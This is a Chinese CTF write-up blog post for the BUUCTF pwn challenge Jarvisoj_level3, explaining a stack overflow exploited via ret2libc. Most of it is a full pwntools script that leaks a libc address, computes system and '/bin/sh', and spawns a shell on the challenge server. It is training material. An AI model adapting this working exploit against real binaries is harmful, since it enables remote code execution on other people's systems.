---
title: "BUUCTF Pwn Jarvisoj_level3"
date: 2020-04-06T21:51:02+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# BUUCTF Pwn Jarvisoj_level3

考点：

1、栈溢出

2、ret2libc

![image-20200406225846093](/images/image-20200406225846093.png)

使用的是kali2020，libc的原因本地打不通，远程可以打

利用write_plt打印出write_got，计算基地址偏移，计算system和"/bin/sh\"地址，然后溢出执行system("/bin/sh\")

第一个payload中执行完write返回地址为mian，让程序能够第二次执行read()

第二个payload执行getshell

```python
#!/usr/bin/env python2
#-*- coding=UTF-8 -*-
from pwn import *
context.log_level = 'debug'
#sh = process('./jarvisoj_level3')
sh = remote('node3.buuoj.cn',28063)
elf = ELF('./jarvisoj_level3')
libc = ELF('./ubuntu16-x86-libc-2.23.so')

offset = 0x88
ebp = 0x4

main_addr = elf.symbols['main']
write_plt = elf.plt['write']
write_got = elf.got['write']
libc_write = libc.symbols['write']
libc_system = libc.symbols['system']
libc_binsh = libc.search('/bin/sh').next()

payload = 'a'*(offset+ebp) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
sh.sendlineafter("Input:\n",payload)

write_real_addr = u32(sh.recv(4))

base_addr = write_real_addr - libc_write
system_addr = libc_system + base_addr
binsh_addr = libc_binsh + base_addr

payload = 'a'*(offset+ebp) + p32(system_addr) + 'dead' + p32(binsh_addr)
sh.sendlineafter("Input:\n",payload)
sh.sendline('cat flag')
sh.interactive()
```

![image-20200406215303076](/images/image-20200406215303076.png)

